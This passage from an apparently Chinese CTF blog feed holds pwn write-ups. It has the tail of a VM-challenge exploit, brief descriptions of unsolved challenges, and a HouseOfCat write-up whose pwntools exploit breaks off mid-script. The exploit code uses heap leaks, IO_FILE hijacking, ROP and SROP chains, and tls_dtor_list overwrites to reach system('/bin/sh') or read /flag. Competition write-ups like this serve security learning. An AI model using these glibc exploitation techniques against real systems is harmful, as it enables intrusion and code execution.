class="hljs-number">0</span>,addr_offset),push(<span class="hljs-number">0</span>),<br>        mov(<span class="hljs-number">0</span>,byte_offset*<span class="hljs-number">8</span>),push(<span class="hljs-number">0</span>),rshift(),<br>        mov(<span class="hljs-number">0</span>,<span class="hljs-number">0xff</span>),push(<span class="hljs-number">0</span>),And(),pop(<span class="hljs-number">0</span>), <span class="hljs-comment"># Reg0 = real_byte</span><br>        mov(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),mov(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), <span class="hljs-comment"># Reg1 for guess byte;Reg2 as tool-reg for += 1</span><br>        push(<span class="hljs-number">1</span>),push(<span class="hljs-number">0</span>),<br>        eq(),   <span class="hljs-comment"># While Reg1 != Reg0</span><br>        jnz(<span class="hljs-number">0x58</span>+<span class="hljs-number">3</span>-<span class="hljs-number">8</span>-<span class="hljs-number">0x42</span>), <span class="hljs-comment"># If Reg1 == Reg0, go RETURN (Debug to attain ip_offset)</span><br>        other(), <span class="hljs-comment"># Side-channel Leak --- each time puts a line of &quot;what???&quot;</span><br>        push(<span class="hljs-number">1</span>),push(<span class="hljs-number">2</span>),add(),pop(<span class="hljs-number">1</span>), <span class="hljs-comment"># Reg1 += 1</span><br>        jmp((<span class="hljs-number">0x38</span>+<span class="hljs-number">4</span>-<span class="hljs-number">0x53</span>-<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xffffffffffffffff</span>), <span class="hljs-comment"># continue</span><br>        halt() <span class="hljs-comment"># return</span><br>    ]<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_addr</span>(<span class="hljs-params">addr_offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    addr = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x4d8</span>//<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;&#x27;</span>.join(leak_byte(addr_offset,<span class="hljs-number">8</span>-<span class="hljs-number">1</span>-i)))<br>        pc = <span class="hljs-number">0</span><br>        side_data = ru(<span class="hljs-string">&quot;finish&quot;</span>)<br>        leaked_byte = side_data.count(<span class="hljs-string">&quot;what???&quot;</span>)<br>        lg(<span class="hljs-string">&#x27;BYTE[%d]&#x27;</span>%(<span class="hljs-number">8</span> - <span class="hljs-number">1</span> -i),leaked_byte)<br>        addr &lt;&lt;= <span class="hljs-number">8</span><br>        addr += leaked_byte<br>    <span class="hljs-keyword">return</span> addr<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Do Leak</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x3000</span>//<span class="hljs-number">8</span>,halt())<br>libc_leak = leak_addr(<span class="hljs-number">0</span>)<br>libc_base = libc_leak - <span class="hljs-number">0x219ce0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Do OOB Write</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>fskey = -<span class="hljs-number">0x2890</span> + libc_base<br>tls_dtor_list = -<span class="hljs-number">0x2918</span> + libc_base<br>memory = -<span class="hljs-number">0x25ff0</span> +libc_base <br>code = mov(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) + store(<span class="hljs-number">0</span>,(fskey-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># fskey = 0</span><br>code += mov(<span class="hljs-number">0</span>,tls_dtor_list+<span class="hljs-number">8</span>) + store(<span class="hljs-number">0</span>,(tls_dtor_list-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># tls_dtor_list = &amp;tls_dtor_list + 8</span><br>code += mov(<span class="hljs-number">0</span>,rol(system_addr,<span class="hljs-number">0x11</span>,<span class="hljs-number">64</span>)) + store(<span class="hljs-number">0</span>,(tls_dtor_list+<span class="hljs-number">8</span>-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># *(&amp;tls_dtor_list + 8) = rol(__libc_system,0x11,64)  # RIP</span><br>code += mov(<span class="hljs-number">0</span>,bin_sh) + store(<span class="hljs-number">0</span>,(tls_dtor_list+<span class="hljs-number">0x10</span>-memory)//<span class="hljs-number">8</span>) <span class="hljs-comment"># *(&amp;tls_dtor_list + 0x10) = rol(__libc_system,0x11,64) # RDI</span><br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x2000000000000000</span>+<span class="hljs-number">0x22000</span>//<span class="hljs-number">8</span>,code)<br><br>sl(<span class="hljs-string">&#x27;bye bye&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babysnitch-10-Solved-Working…"><a class="header-anchor" href="#babysnitch-10-Solved-Working…">¶</a>babysnitch (10 Solved)(Working…)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220922162517106.png" alt="babysnitch"></p><h3 id="题目描述-v3"><a class="header-anchor" href="#题目描述-v3">¶</a>题目描述</h3><p>I have my application firewall installed. It should protect my flag even against RCE. Isn’t It?</p><p><a href="https://drive.google.com/file/d/1A-isglKqxCjePSDtRMTN0mJ2ep8NTyC6/view?usp=sharing">attachment</a></p><h3 id="题目分析-v2"><a class="header-anchor" href="#题目分析-v2">¶</a>题目分析</h3><h2 id="qqbot-3-Solved-Working…"><a class="header-anchor" href="#qqbot-3-Solved-Working…">¶</a>qqbot (3 Solved)(Working…)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220922162924198.png" alt="qqbot"></p><h3 id="题目描述-v4"><a class="header-anchor" href="#题目描述-v4">¶</a>题目描述</h3><p>We prepare some bots for you, fool one of them and get flag. + qqbot01@localhost + qqbot02@localhost + qqbot03@localhost + qqbot04@localhost + qqbot05@localhost The bot is on ubuntu 20.04 and flag in <code>/flag</code></p><p><a href="https://drive.google.com/file/d/1eBb4Cmm-dVQ4Z914hzICthOH8iMjedp_/view?usp=sharing">attachment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 强网杯初赛 Pwn 部分题解及赛后复现</title>
    <link href="/posts/cfd0f35d.html"/>
    <url>/posts/cfd0f35d.html</url>
    
    <content type="html"><![CDATA[<p>18 道 pwn ，把 👴 给冲烂了，给 👴 带来了巨大的心灵震撼与阴影。👴 比较菜，比赛时也就出了比较简单的三道，其他的 👴 是真的不会，👴 下去好好反思。</p><h3 id="HouseOfCat"><a class="header-anchor" href="#HouseOfCat">¶</a>HouseOfCat</h3><h4 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h4><p>一血题，套了IOT板子的 2.35 版本下 <strong>UAF</strong> 利用。</p><p><strong>核心思路</strong>：在调用<code>_wide_vtable</code>里面的成员函数指针时，<strong>没有关于vtable的合法性检查</strong>。</p><p>一次 Largebin 打 stderr，一次 Largebin 打 main_arena Topchunk 地址，走 kiwi 触发 IO 流利用 <code>_wide_data</code> 成员控制执行流完成 orw。</p><p>需要注意的是 Edit 提供的写入字节数明显不足，需要在 Add 时提前布置好 payload。</p><h4 id="Exp"><a class="header-anchor" href="#Exp">¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/pwn/source/glibc-2.35/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">IO_FILE</span>(<span class="hljs-params">_flags = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_read_ptr = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_read_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_read_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_write_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_write_ptr = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_write_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_buf_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_buf_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_save_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_backup_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_save_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_marker = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_chain = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _fileno = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _lock = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _wide_data = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _mode = <span class="hljs-number">0</span></span>):<br>    fake_IO_FILE = p32(_flags) + \<br>             p32(<span class="hljs-number">0</span>) + \<br>             p64(_IO_read_ptr) + \<br>             p64(_IO_read_end) + \<br>             p64(_IO_read_base) + \<br>             p64(_IO_write_base) + \<br>             p64(_IO_write_ptr) + \<br>             p64(_IO_write_end) + \<br>             p64(_IO_buf_base) + \<br>             p64(_IO_buf_end) + \<br>             p64(_IO_save_base) + \<br>             p64(_IO_backup_base) + \<br>             p64(_IO_save_end) + \<br>             p64(_IO_marker) + \<br>             p64(_IO_chain) + \<br>             p32(_fileno)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(_lock)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(_wide_data)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(_mode)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    <span class="hljs-keyword">return</span> fake_IO_FILE<br><br>elf = ELF(<span class="hljs-string">&#x27;./house_of_cat&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./house_of_cat&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;59.110.212.61&#x27;</span>,<span class="hljs-number">16938</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    msg = <span class="hljs-string">&#x27;&#x27;&#x27;LOGIN \x7C r00t QWB QWXFadmin\0&#x27;&#x27;&#x27;</span><br>    sla(<span class="hljs-string">&#x27;mew mew mew~~~~~~\n&#x27;</span>,<span class="hljs-built_in">str</span>(msg))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>():<br>    msg = <span class="hljs-string">&#x27;&#x27;&#x27;CAT  \x7C r00t QWB QWXF&#x27;&#x27;&#x27;</span>+p32(<span class="hljs-number">0x0FFFFFFFF</span>)+<span class="hljs-string">&#x27;$&#x27;</span><br>    sla(<span class="hljs-string">&#x27;mew mew mew~~~~~~\n&#x27;</span>,<span class="hljs-built_in">str</span>(msg))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,size,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;plz input your cat size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data</span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br>login()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x428</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x458</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x468</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x468</span>)<br>dele(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x219ce0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>rdi2rdx = libc_base + <span class="hljs-number">0x1675b0</span><br>dele(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Context:\n&#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">6</span>))<br>heap_base = heap_leak - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>dele(<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">3</span>)<br>stderr = <span class="hljs-number">0x21a860</span> + libc_base<br>_IO_wfile_jumps = <span class="hljs-number">0x2160c0</span> + libc_base<br>rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002be51</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x000000000011f497</span><br>jmp_rsi = libc_base + <span class="hljs-number">0x000000000003d3cf</span><br>ret = libc_base + <span class="hljs-number">0x0000000000029cd6</span><br>rax = libc_base + <span class="hljs-number">0x0000000000045eb0</span><span class="hljs-comment"># 0x0000000000045eb0 : pop rax ; ret</span><br>addr =heap_base<br>rdi_rdx = libc_base + <span class="hljs-number">0x1675b0</span><br>syscall_ret = libc_base + <span class="hljs-number">0x0000000000091396</span> <span class="hljs-comment"># 0x0000000000091396: syscall; ret; </span><br><br>orw = flat([<br>    <span class="hljs-number">0</span>,rdi,<span class="hljs-number">0</span>,libc.sym.close,rax,<span class="hljs-number">2</span>,rdi,heap_base+<span class="hljs-number">0x2b0</span>,rsi,<span class="hljs-number">0</span>,syscall_ret,rdi,<span class="hljs-number">0</span>,rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,rsi,heap_base+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x20</span>,libc.sym.read,rdi,<span class="hljs-number">1</span>,libc.sym.write<br>])+<span class="hljs-string">&#x27;/flag\0\0\0&#x27;</span><br>addr = heap_base+<span class="hljs-number">0x200</span><br>fuck = SigreturnFrame()<br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = addr<br>fuck.rdx = <span class="hljs-number">0x300</span><br>fuck.rsp = addr + <span class="hljs-number">8</span><br>fuck.rip = libc.sym.read<br>guard = libc_base - <span class="hljs-number">0x2890</span><br>_IO_wstrn_jumps = libc_base + <span class="hljs-number">0x215dc0</span> - <span class="hljs-number">0x38</span> + <span class="hljs-number">24</span><br>_IO_cookie_jumps = libc_base +<span class="hljs-number">0x215b80</span> - <span class="hljs-number">0x38</span> + <span class="hljs-number">24</span><br>lg(<span class="hljs-string">&#x27;guard&#x27;</span>,guard)<br>payload = IO_FILE(_IO_read_end=<span class="hljs-number">1</span>,_IO_write_ptr=stderr-<span class="hljs-number">0x20</span>,_lock=heap_base+<span class="hljs-number">0x10</span>,_IO_chain=heap_base+<span class="hljs-number">0x3a0</span>,_wide_data=heap_base+<span class="hljs-number">0xc40</span>)[<span class="hljs-number">0x10</span>:]+p64(_IO_wfile_jumps)<br>payload = payload.ljust(<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>payload += <span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">0xe0</span>]+p64(heap_base+<span class="hljs-number">0xd40</span>-<span class="hljs-number">0x68</span>)<br>payload = payload.ljust(<span class="hljs-number">0x1f0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>) + p64(magic)<br><br><br><span class="hljs-comment"># payload += IO_FILE(_IO_write_ptr=0xffffffffffffffff,_IO_chain=0,_lock=0) + p64(_IO_cookie_jumps + 0x60) + p64(heap_base+0x4a0) + p64(0) + p64(rol(rdi_rdx ^ (heap_base+0x390), 0x11,64))</span><br><span class="hljs-comment"># payload = payload.ljust(0x1f0,&#x27;\0&#x27;)</span><br><span class="hljs-comment"># payload += p64(0)+p64(heap_base+0x4a0)+p64(0)*2+p64(magic)+str(fuck)[0x28:]</span><br><span class="hljs-comment"># payload = payload.ljust(0x2f0,&#x27;\0&#x27;)</span><br><span class="hljs-comment"># payload += mmp</span><br><br>fake1 = libc_base + <span class="hljs-number">0x21a0e0</span><br>fake2 = heap_base + <span class="hljs-number">0x290</span><br><span class="hljs-comment"># add(4,0x458,&#x27;u&#x27;*0x20+payload[0x20:])</span><br><span class="hljs-comment"># add(5,0x458)</span><br><span class="hljs-comment"># add(6,0x448)</span><br><span class="hljs-comment"># dele(4)</span><br><span class="hljs-comment"># add(7,0x468)</span><br><span class="hljs-comment"># dele(6)</span><br><span class="hljs-comment"># edit(4,p64(fake1)*2 + p64(fake2) + p64(stderr-0x20))</span><br><span class="hljs-comment"># add(8,0x420)</span><br><br><span class="hljs-comment"># dele(8)</span><br><span class="hljs-comment"># edit(4,p64(fake1)*2 + p64(fake2) + p64(0x7ffff7fa5ce0-0x20))</span><br><span class="hljs-comment"># add(9,0x420)</span><br><span class="hljs-comment"># add(10,0x468)</span><br><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x448</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x458</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x450</span>+pack(-<span class="hljs-number">2059</span>))<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x458</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x20</span>+payload[<span class="hljs-number">0x20</span>:])<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x468</span>)<br>dele(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x468</span>)<br>dele(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">6</span>,p64(fake1)*<span class="hljs-number">2</span> + p64(fake2) + p64(stderr-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x420</span>)<br><br>dele(<span class="hljs-number">9</span>)<br>edit(<span class="hljs-number">6</span>,p64(fake1)*<span class="hljs-number">2</span> + p64(fake2) + p64(libc_base+<span class="hljs-number">0x219ce0</span>-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x420</span>)<br><span 